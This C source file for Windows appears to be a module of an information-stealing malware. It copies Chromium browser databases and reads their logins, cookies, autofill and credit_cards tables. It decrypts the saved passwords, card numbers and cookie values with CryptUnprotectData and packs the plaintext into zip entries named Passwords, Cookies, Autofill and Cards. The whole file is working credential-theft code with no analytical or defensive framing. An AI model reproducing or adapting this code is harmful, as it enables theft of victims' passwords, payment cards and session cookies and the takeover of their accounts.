#include <windows.h>
#include <shlwapi.h>
#include <stdint.h>
#include "Zip.h"
#include "Vector.h"
#include "SqlHandler.h"
#include "CModule.h"

DWORD randomInt() {
	static int random;
	if (random) random += GetTickCount(); else random = GetTickCount();
	return random;
}

WCHAR* genNewDb(PCWCHAR db) {
	WCHAR* newDb = (WCHAR*)malloc(32767 * sizeof(WCHAR));
	wnsprintfW(newDb, 32767, L"%s.%u", db, GetTickCount());
	CopyFileW(db, newDb, FALSE);
	return newDb;
}

char* strdup_m(const char* str) {
	char* mem = (char*)malloc(lstrlenA(str) + 1);
	lstrcpyA(mem, str);
	return mem;
}

char* UnProtect(BYTE* pass, SIZE_T srclen, SIZE_T* out_len) {
	DATA_BLOB in;
	DATA_BLOB out;

	if (pass == NULL || srclen < 1) {
		CHAR* m = (CHAR*)malloc(2);
		lstrcpyA(m, " ");
		return m;
	}

	in.pbData = (BYTE*)malloc(srclen);
	in.cbData = srclen;
	memcpy(in.pbData, pass, srclen);

	if (CryptUnprotectData(&in, 0, 0, 0, 0, 0, &out)) {
		char *decrypted_mem = (char *)malloc(out.cbData + 1);

		memcpy(decrypted_mem, out.pbData, out.cbData);
		decrypted_mem[out.cbData] = 0;

		free(in.pbData);
		LocalFree(out.pbData);

		if(out_len) *out_len = out.cbData;
		return decrypted_mem;
	}
	else {
		free(in.pbData);
		return NULL;
	}
}

void exportChromium(PCWCHAR db, vector* vec, DWORD* collectedSize, INT dwType) {
	if (SqlHandler(db))
		if(dwType == TYPE_CREDITS){
			if (ReadTable("credit_cards")) {
				for (int i = 0; i < GetRowCount(); i++) {
					DWORD numberSize;

					BYTE* nameValue = GetValue(i, 1, 0);
					BYTE* mounthValue = GetValue(i, 2, 0);
					BYTE* yearValue = GetValue(i, 3, 0);
					BYTE* numberValue = GetValue(i, 4, &numberSize);
					CHAR* numberValueDecrypted = UnProtect(numberValue, numberSize, 0);

					*collectedSize += 51;
					*collectedSize += lstrlenA((CHAR*)nameValue);
					*collectedSize += lstrlenA((CHAR*)mounthValue);
					*collectedSize += lstrlenA((CHAR*)yearValue);
					*collectedSize += lstrlenA((CHAR*)numberValueDecrypted);

					vector_add(vec, strdup_m("HOLDER NAME: "));
					vector_add(vec, strdup_m((CHAR*)nameValue));
					vector_add(vec, strdup_m("\r\nMOUNTH: "));
					vector_add(vec, strdup_m((CHAR*)mounthValue));
					vector_add(vec, strdup_m("\r\nYEAR: "));
					vector_add(vec, strdup_m((CHAR*)yearValue));
					vector_add(vec, strdup_m("\r\nNUMBER: "));
					vector_add(vec, strdup_m((CHAR*)numberValueDecrypted));
					vector_add(vec, strdup_m("\r\n\r\n"));
				}
			}
		}
		else if (dwType == TYPE_AUTOFILL) {
			if (ReadTable("autofill")) {
				for (int i = 0; i < GetRowCount(); i++) {
					BYTE* nameValue = GetValue(i, 0, 0);
					BYTE* dataValue = GetValue(i, 1, 0);

					*collectedSize += 27;
					*collectedSize += lstrlenA((CHAR*)nameValue);
					*collectedSize += lstrlenA((CHAR*)dataValue);

					vector_add(vec, strdup_m("HTML NAME: "));
					vector_add(vec, strdup_m((CHAR*)nameValue));
					vector_add(vec, strdup_m("\r\nVALUE: "));
					vector_add(vec, strdup_m((CHAR*)dataValue));
					vector_add(vec, strdup_m("\r\n\r\n"));
				}
			}
		}
		else if (dwType == TYPE_COOKIES) {
			if (ReadTable("cookies")) {
				for (int i = 0; i < GetRowCount(); i++) {
					DWORD encryptedSize;

					BYTE* hostkeyValue = GetValue(i, 1, 0);
					BYTE* is_httponlyValue = GetValue(i, 7, 0);
					BYTE* pathValue = GetValue(i, 4, 0);
					BYTE* issecureValue = GetValue(i, 6, 0);
					BYTE* expires_utcValue = GetValue(i, 5, 0);
					BYTE* nameValue = GetValue(i, 2, 0);
					BYTE* encrypted_valueValue = GetValue(i, 12, &encryptedSize);
					CHAR* decrypted_valueValue = UnProtect((BYTE*)encrypted_valueValue, encryptedSize, 0);

					*collectedSize += 15;
					*collectedSize += lstrlenA((CHAR*)hostkeyValue);
					*collectedSize += lstrlenA((CHAR*)is_httponlyValue);
					*collectedSize += lstrlenA((CHAR*)pathValue);
					*collectedSize += lstrlenA((CHAR*)issecureValue);
					*collectedSize += lstrlenA((CHAR*)expires_utcValue);
					*collectedSize += lstrlenA((CHAR*)nameValue);
					*collectedSize += lstrlenA((CHAR*)decrypted_valueValue);

					vector_add(vec, strdup_m((CHAR*)hostkeyValue));
					vector_add(vec, strdup_m("\t"));
					vector_add(vec, strdup_m((CHAR*)is_httponlyValue));
					vector_add(vec, strdup_m("\t"));
					vector_add(vec, strdup_m((CHAR*)pathValue));
					vector_add(vec, strdup_m("\t"));
					vector_add(vec, strdup_m((CHAR*)issecureValue));
					vector_add(vec, strdup_m("\t"));
					vector_add(vec, strdup_m((CHAR*)expires_utcValue));
					vector_add(vec, strdup_m("\t"));
					vector_add(vec, strdup_m((CHAR*)nameValue));
					vector_add(vec, strdup_m("\t"));
					vector_add(vec, strdup_m((CHAR*)decrypted_valueValue));
					vector_add(vec, strdup_m("\r\n"));
				}
			}
		} else if (dwType == TYPE_PASSWORDS) {
			if(ReadTable("logins")) {
				for (int i = 0; i < GetRowCount(); i++) {
					DWORD passwordSize;

					BYTE* websiteValue = GetValue(i, 1, 0);
					BYTE* usernameValue = GetValue(i, 3, 0);
					BYTE* passwordValue = GetValue(i, 5, &passwordSize);
					CHAR* decryptedPasswordValue = UnProtect((BYTE*)passwordValue, passwordSize, 0);

					*collectedSize += 41;
					*collectedSize += lstrlenA((CHAR*)websiteValue);
					*collectedSize += lstrlenA((CHAR*)usernameValue);
					*collectedSize += lstrlenA((CHAR*)decryptedPasswordValue);

					vector_add(vec, strdup_m("WEBSITE: "));
					vector_add(vec, strdup_m((CHAR*)websiteValue));
					vector_add(vec, strdup_m("\r\nUSERNAME: "));
					vector_add(vec, strdup_m((CHAR*)usernameValue));
					vector_add(vec, strdup_m("\r\nPASSWORD: "));
					vector_add(vec, strdup_m((CHAR*)decryptedPasswordValue));
					vector_add(vec, strdup_m("\r\n\r\n"));
				}
			}
		}


	SqlHandleFree();
}

char* chromiumGetString(PCWSTR db, DWORD* dwCount, INT dwMethod) {
	DWORD sz;
	vector vect;
	vector_init(&vect);

	exportChromium(db, &vect, &sz, dwMethod);

	char* str = (char*)malloc(sz + 1);
	memset(str, 0, sz + 1);

	for (int i = 0; i < vector_count(&vect); i++) {
		wnsprintfA(str + lstrlenA(str), sz - lstrlenA(str), "%s", vector_get(&vect, i));
		free(vector_get(&vect, i));
		*dwCount = 1;
	}

	vector_free(&vect);

	return str;
}

void doChromium(HZIP zip, PCWCHAR db, DWORD* dwCount, INT dwMethod) {
	WCHAR* nameMemory = (WCHAR*)malloc(260 * sizeof(WCHAR));

	if(dwMethod == TYPE_PASSWORDS)
		wnsprintfW(nameMemory, 260, L"S.%u.Passwords.txt", randomInt());
	else if(dwMethod == TYPE_COOKIES)
		wnsprintfW(nameMemory, 260, L"S.%u.Cookies.txt", randomInt());
	else if(dwMethod == TYPE_AUTOFILL)
		wnsprintfW(nameMemory, 260, L"S.%u.Autofill.txt", randomInt());
	else if(dwMethod == TYPE_CREDITS)
		wnsprintfW(nameMemory, 260, L"S.%u.Cards.txt", randomInt());

	WCHAR* newDb = genNewDb(db);
	char* str = chromiumGetString(newDb, dwCount, dwMethod);
	DeleteFileW(newDb);
	free(newDb);

	ZipAdd(zip, nameMemory, str, lstrlenA(str));
	free(nameMemory);
	free(str);
}